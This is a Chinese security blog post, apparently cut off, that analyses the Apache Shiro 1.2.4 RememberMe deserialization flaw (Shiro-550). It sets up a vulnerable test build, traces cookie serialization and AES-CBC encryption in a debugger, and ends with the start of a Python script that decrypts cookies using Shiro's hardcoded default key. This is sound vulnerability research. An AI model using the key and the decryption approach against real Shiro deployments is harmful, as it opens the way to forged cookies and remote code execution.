<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Shiro反序列化 | F4DE</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210328234543.jpg">
    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <meta name="description" content="F4DE's blog">
    <meta name="keywords" content="sec,Java,Web安全,php,python,Java安全，Shiro,tomcat">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.159b5157.css" as="style"><link rel="preload" href="/assets/js/app.65b722b4.js" as="script"><link rel="preload" href="/assets/js/2.977200c2.js" as="script"><link rel="preload" href="/assets/js/16.81740bbb.js" as="script"><link rel="prefetch" href="/assets/js/10.4af3d843.js"><link rel="prefetch" href="/assets/js/11.b1484fde.js"><link rel="prefetch" href="/assets/js/12.a173933a.js"><link rel="prefetch" href="/assets/js/13.b251eba7.js"><link rel="prefetch" href="/assets/js/14.4da1268a.js"><link rel="prefetch" href="/assets/js/15.f0a43138.js"><link rel="prefetch" href="/assets/js/17.6793069f.js"><link rel="prefetch" href="/assets/js/18.60239342.js"><link rel="prefetch" href="/assets/js/19.9cea8bb5.js"><link rel="prefetch" href="/assets/js/20.b202d09b.js"><link rel="prefetch" href="/assets/js/21.89b9c043.js"><link rel="prefetch" href="/assets/js/22.e3c80ae4.js"><link rel="prefetch" href="/assets/js/23.87206499.js"><link rel="prefetch" href="/assets/js/24.2cdeb528.js"><link rel="prefetch" href="/assets/js/25.db23ca66.js"><link rel="prefetch" href="/assets/js/26.5c1c7799.js"><link rel="prefetch" href="/assets/js/27.814b237a.js"><link rel="prefetch" href="/assets/js/28.570e7aa5.js"><link rel="prefetch" href="/assets/js/29.3baeeaaf.js"><link rel="prefetch" href="/assets/js/3.c65c974d.js"><link rel="prefetch" href="/assets/js/30.d3281462.js"><link rel="prefetch" href="/assets/js/31.eff56ba9.js"><link rel="prefetch" href="/assets/js/32.85430c1b.js"><link rel="prefetch" href="/assets/js/4.3f1430b9.js"><link rel="prefetch" href="/assets/js/5.049b3fbc.js"><link rel="prefetch" href="/assets/js/6.556dea02.js"><link rel="prefetch" href="/assets/js/7.84c18175.js"><link rel="prefetch" href="/assets/js/8.98b9b228.js"><link rel="prefetch" href="/assets/js/9.a4ba5c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.159b5157.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="https://www.f4de.ink/img/EB-logo.png" alt="F4DE" class="logo"> <span class="site-name can-hide">F4DE</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/sec/" class="nav-link">技术</a></div><div class="nav-item"><a href="/note/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">随笔</a></div><div class="nav-item"><a href="/pages/fe0f85/" class="nav-link">关于</a></div><div class="nav-item"><a href="/pages/3a4789/" class="nav-link">友链</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210328234543.jpg"> <div class="blogger-info"><h3>F4DE</h3> <span>Web Security</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/sec/" class="nav-link">技术</a></div><div class="nav-item"><a href="/note/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">随笔</a></div><div class="nav-item"><a href="/pages/fe0f85/" class="nav-link">关于</a></div><div class="nav-item"><a href="/pages/3a4789/" class="nav-link">友链</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Java安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>Tomcat</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>Shiro</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/298df2/" class="sidebar-link">Shiro权限绕过1</a></li><li><a href="/pages/2e3889/" class="sidebar-link">Shiro权限绕过2</a></li><li><a href="/pages/92d911/" class="sidebar-link">Shiro权限绕过3</a></li><li><a href="/pages/c398ec/" class="sidebar-link">Shiro权限绕过4</a></li><li><a href="/pages/22d305/" aria-current="page" class="active sidebar-link">Shiro反序列化</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/22d305/#介绍" class="sidebar-link">介绍</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#环境搭建" class="sidebar-link">环境搭建</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#调试分析" class="sidebar-link">调试分析</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/22d305/#序列化加密过程" class="sidebar-link">序列化加密过程</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#反序列化解密过程" class="sidebar-link">反序列化解密过程</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#aes-cbc安全性" class="sidebar-link">AES-CBC安全性</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/22d305/#测试gadget" class="sidebar-link">测试Gadget</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/22d305/#urldns" class="sidebar-link">URLDNS</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#cc2" class="sidebar-link">CC2</a></li><li class="sidebar-sub-header"><a href="/pages/22d305/#jrmp" class="sidebar-link">JRMP</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/22d305/#reference" class="sidebar-link">Reference</a></li></ul></li><li><a href="/pages/ca9de1/" class="sidebar-link">利用TemplatesImpl改造CC6攻击Shiro</a></li><li><a href="/pages/3727d2/" class="sidebar-link">通过动态类加载解决【通过Tomcat全局存储进行回显】在Shiro中的Header过长问题</a></li><li><a href="/pages/ecfe38/" class="sidebar-link">在Shiro中使用无CommonsCollections依赖的CommonsBeanUtils利用链</a></li></ul></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>字节码</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>反序列化</span> <span class="arrow right"></span></p> <!----></section></li></ul></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-33863c7e><div class="articleInfo" data-v-33863c7e><ul class="breadcrumbs" data-v-33863c7e><li data-v-33863c7e><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-33863c7e></a></li> <li data-v-33863c7e><a href="/sec" title="技术-目录页" data-v-33863c7e>技术</a></li> <li data-v-33863c7e><a href="/sec/#Java安全" title="技术#Java安全" data-v-33863c7e>Java安全</a></li> <li data-v-33863c7e><a href="/sec/#Shiro" title="技术#Shiro" data-v-33863c7e>Shiro</a></li></ul> <div class="info" data-v-33863c7e><div title="作者" class="author iconfont icon-touxiang" data-v-33863c7e><a href="https://github.com/F4ded" target="_blank" title="作者" class="beLink" data-v-33863c7e>F4DE</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-33863c7e><a href="javascript:;" data-v-33863c7e>2021-03-25</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          Shiro反序列化
        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><p>Shiro漏洞复盘系列--1.2.4版本产生的反序列化安全问题。（Shiro-550）</p> <h2 id="介绍"><a href="#介绍" class="header-anchor">#</a> 介绍</h2> <p>Shiro对于RememberMe Cookie的处理方式如下：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210324232800.png" alt="image-20210324232800002"></p> <ul><li>检索该Cookie的值</li> <li>Base64解码</li> <li>AES解密</li> <li>使用Java中原生的<code>ObjectInputStream</code>反序列化</li></ul> <p>Shiro1.2.4版本及以下的AES的key是硬编码在其中的，<code>org.apache.shiro.mgt.AbsetractRememberMeManager</code>：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325195133.png" alt="image-20210324233334049"></p> <p>解密AES算法还需要两个要素：</p> <ul><li>mode（加解密算法）</li> <li>IV（初始化向量）</li></ul> <p>如果可以再确定以上两者，则可以通过构造Cookie的值从而触发反序列化Gadget（Shiro-550）。</p> <h2 id="环境搭建"><a href="#环境搭建" class="header-anchor">#</a> 环境搭建</h2> <p>下载Shiro1.2.4版本：</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">git</span> clone https://github.com/apache/shiro.git  
<span class="token builtin class-name">cd</span> shiro
<span class="token function">git</span> checkout shiro-root-1.2.4
</code></pre></div><p>编辑<code>shiro\samples\web\pom.xml</code>文件，修改<code>jtsl</code>版本为1.2并且加入<code>commons-collections4</code>依赖：</p> <ul><li><code>jstl</code>是为了正确识别JSP标签</li> <li><code>commons-collections4</code>是为了方便后续漏洞复现</li></ul> <div class="language-xml extra-class"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jstl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>runtime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>用IDEA导入<code>shiro\samples\web\pom.xml</code>项目，然后等待依赖下载，然后执行<code>mvn install</code>，如果出现以下错误，则需要额外在你的<code>./m2</code>文件夹下创建<code>toolchains.xml</code>，然后写入以下内容：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325192945.png" alt="image-20210325192945203"></p> <div class="language-xml extra-class"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>toolchains</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://maven.apache.org/TOOLCHAINS/1.1.0<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!--插入下面代码--&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>toolchain</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>jdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>provides</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vendor</span><span class="token punctuation">&gt;</span></span>sun<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>vendor</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>provides</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!--这里是你安装jdk的文件目录--&gt;</span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdkHome</span><span class="token punctuation">&gt;</span></span>{Your_Path}/1.6.0.jdk/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdkHome</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>toolchain</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>toolchains</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>之后就是添加Tomcat并且配置<code>Artifact</code>，不再赘述，环境搭建成功之后的页面：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193632.png" alt="image-20210325193632795"></p> <h2 id="调试分析"><a href="#调试分析" class="header-anchor">#</a> 调试分析</h2> <h3 id="序列化加密过程"><a href="#序列化加密过程" class="header-anchor">#</a> 序列化加密过程</h3> <p>登录时勾选<code>Remember Me</code>：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193814.png" alt="image-20210325193813966"></p> <p>登录成功后就会在Cookie中发现<code>rememberMe</code>字段：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193934.png" alt="image-20210325193934623"></p> <p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>打下断点，发送登录请求，开始调试：</p> <img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000957.png" alt="image-20210325000957209" style="zoom:80%;"> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000822.png" alt="image-20210325000822124"></p> <p>如果勾选了RememberMe功能，则会进入<code>remembertIdentity</code>方法中：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325001716.png" alt="image-20210325001716672"></p> <p><code>getIndentityToRemember</code>方法会将用户的身份信息封装成一个对象，之后传入<code>rememberIdentity</code>方法：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002021.png" alt="image-20210325002020908"></p> <p><code>convertPrincipalsToBytes</code>方法会将之前得到包含用户信息的对象转化成一个bytes数组类型的对象，我们跟入该方法：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002206.png" alt="image-20210325002206022"></p> <p>可以看到，先将<code>principals</code>对象进行序列化，之后再调用<code>encrypt</code>方法进行加密，先跟入<code>serialize</code>方法，可以看到Shiro是采用了Java中原生的<code>ObjectOutputStream#writeObject</code>方法进行序列化的，之后返回序列化信息的bytes数组对象：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002334.png" alt="image-20210325002334553"></p> <p>这个bytes数组对象会传入到<code>encrypt</code>方法中去，接着跟进<code>encrypt</code>方法：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003201.png" alt="image-20210325003201299"></p> <p>通过<code>getCipherService</code>方法可以获取到一个用于加密的<code>CipherService</code>接口对象，这个对象是在当前类的构造方法中就完成初始化了的：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003657.png" alt="image-20210325003657499"></p> <p><code>AesCipherService</code>间接实现了<code>CipherService</code>接口，并且如果再跟进的话，可以发现<code>AesCipherService</code>也是调用了父类的构造方法进行初始化，确定了加密方式以及mode：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004132.png" alt="image-20210325004132251"></p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004150.png" alt="image-20210325004150470"></p> <p>同样在Debug控制台也可以获取到对应的信息：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004253.png" alt="image-20210325004253589"></p> <p>回到<code>encrypt</code>方法中来，接着跟进<code>cipherService#encrypt</code>，这里传入的第一个参数就是序列化之后的bytes数组，第二个参数就是之前提到的硬编码的AES-Key：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004546.png" alt="image-20210325004546278"></p> <p>通过<code>generateInitializationVector</code>方法获取到的其实是一个长度为16的随机字节数组，一路跟入到<code>org.apache.shiro.crypto.JcaCipherService#generateInitializationVector</code>：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005140.png" alt="image-20210325005140075"></p> <p>通过<code>SecureRandom</code>来生成随机数，然后写入到长度为16的字节数组中，这个数组就是AES的初始化向量（IV），随后被传入<code>encrypt</code>方法中去：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005501.png" alt="image-20210325005501229"></p> <p><code>org.apache.shiro.crypto.JcaCipherService#encrypt</code>：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082245.png" alt="image-20210325082219984"></p> <p>在第324行中的<code>crypt</code>方法把序列化数据、AES-Key、IV、MODE传入方法，进行AES加密，之后再把十六字节的IV和加密后的密文<code>encrypted</code>进行数组的拼接：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082500.png" alt="image-20210325082500537"></p> <p>最后一路返回到<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code>方法中，经上面分析可知，最好加密的结果为<code>十六字节的IV</code> + <code>AES密文</code>：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082743.png" alt="image-20210325082743615"></p> <p>再返回到<code>remembertIdentity</code>方法中，将加密完成后的整段密文传入<code>rememberSerializedIdentity</code>方法中：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083414.png" alt="image-20210325083414344"></p> <p>跟入<code>rememberSerializedIdentity</code>方法中，会把Base64编码之后的密文放入Cookie中：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083506.png" alt="image-20210325083506860"></p> <h3 id="反序列化解密过程"><a href="#反序列化解密过程" class="header-anchor">#</a> 反序列化解密过程</h3> <p>发送只有RememberMe Cookie的请求，在<code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code>方法中打下断点：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325093936.png" alt="image-20210325093936498"></p> <p>Cookie等信息都封装在<code>subjectContext</code>对象之中，跟入<code>rmm.getRememberedPrincipals</code>方法：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094251.png" alt="image-20210325094251283"></p> <p>接着跟入<code>getRememberedSerializedIdentity</code>方法，在这个方法中会把请求中携带的Cookie信息提取出来进行Base64解码，然后返回解码之后的bytes数组对象：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094521.png" alt="image-20210325094521328"></p> <p>返回之后回到<code>getRememberedPrincipals</code>方法中，接着跟入<code>convertBytesToPrincipals</code>方法，这个方法中会把上一步得到的bytes数组进行解密，然后进行反序列化：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094659.png" alt="image-20210325094659443"></p> <p>跟入<code>decrypt</code>方法，整个流程就类似与序列化加密的过程，在获取到解密对象之后把加密的bytes数组和硬编码的AES-Key进行解密：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094833.png" alt="image-20210325094833446"></p> <p>跟入<code>cipherService.decrypt</code>方法，这个方法中会把前十六位的IV提取出来，之后用AES-Key进行解密：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095013.png" alt="image-20210325095013104"></p> <p>解密之后的数据回到<code>convertBytesToPrincipals</code>方法中，传入<code>deserialize</code>方法：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095126.png" alt="image-20210325095126639"></p> <p>跟入该方法，可以发现采用了原生<code>ObjectInputStream#readObject</code>方法来进行反序列化数据：</p> <p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095345.png" alt="image-20210325095345775"></p> <h3 id="aes-cbc安全性"><a href="#aes-cbc安全性" class="header-anchor">#</a> AES-CBC安全性</h3> <h4 id="cookie解密"><a href="#cookie解密" class="header-anchor">#</a> Cookie解密</h4> <p>由<a href="https://www.jianshu.com/p/45848dd484a9" target="_blank" rel="noopener noreferrer">关于AES加解密中CBC模式的IV初始化向量的安全性问题<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>这篇文章可以认识到，CBC解密的时候如果IV向量错误，只会影响第一个块的数据解密结果，而之后其他块的IV则是上一个块的加密数据。</p> <p>在Shiro的RememberMe数据的第一个块就是IV向量，所以使用一个错误的IV向量来对Cookie进行解密，只会让正确的IV的解密错误，而不影响真正数据的解密结果。</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token comment"># python2</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES

key <span class="token operator">=</span> <span class="token string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>
MODE <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
IV <span class="token operator">=</span> <span class="token string">b' '</span> <span class="token operator">*</span> <span class="token number">16</span>
encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> MODE<span class="token punctuation">,</span> IV<span class="token punctuation">)</span>
